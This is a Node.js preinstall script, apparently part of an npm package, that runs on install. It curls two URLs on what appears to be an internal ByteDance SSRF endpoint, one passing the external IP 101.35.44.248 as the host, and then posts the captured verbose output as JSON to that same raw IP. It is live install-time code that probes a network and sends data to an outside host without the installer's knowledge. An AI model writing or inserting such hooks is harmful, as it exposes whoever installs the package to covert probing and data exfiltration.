const { execSync } = require('child_process');
const http = require('http');

console.log('[PREINSTALL] running...');

function postBack(data) {
  const body = JSON.stringify(data);
  console.log('[PREINSTALL] posting:', body.slice(0, 300));
  const req = http.request({
    hostname: '101.35.44.248',
    port: 80,
    path: '/',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
  }, (res) => {
    console.log('[PREINSTALL] postback status:', res.statusCode);
  });
  req.on('error', (e) => {
    console.log('[PREINSTALL] postback error:', e.message);
  });
  req.write(body);
  req.end();
}

const TARGETS = [
  'https://src-ssrf.bytedance.net/ssrf',
  'https://src-ssrf.bytedance.net/ssrf?host=101.35.44.248',
];

const results = {};
for (const url of TARGETS) {
  try {
    const r = execSync(`curl -s --connect-timeout 5 -v "${url}" 2>&1`, { timeout: 8000 }).toString().trim();
    results[url] = r.slice(0, 500);
    console.log('[PREINSTALL] curl', url, '->', r.slice(0, 200));
  } catch (e) {
    results[url] = 'ERROR: ' + e.message;
    console.log('[PREINSTALL] curl', url, 'FAIL:', e.message);
  }
}

console.log('[PREINSTALL] results:', JSON.stringify(results).slice(0, 500));
postBack({ type: 'ssrf-probe', results });
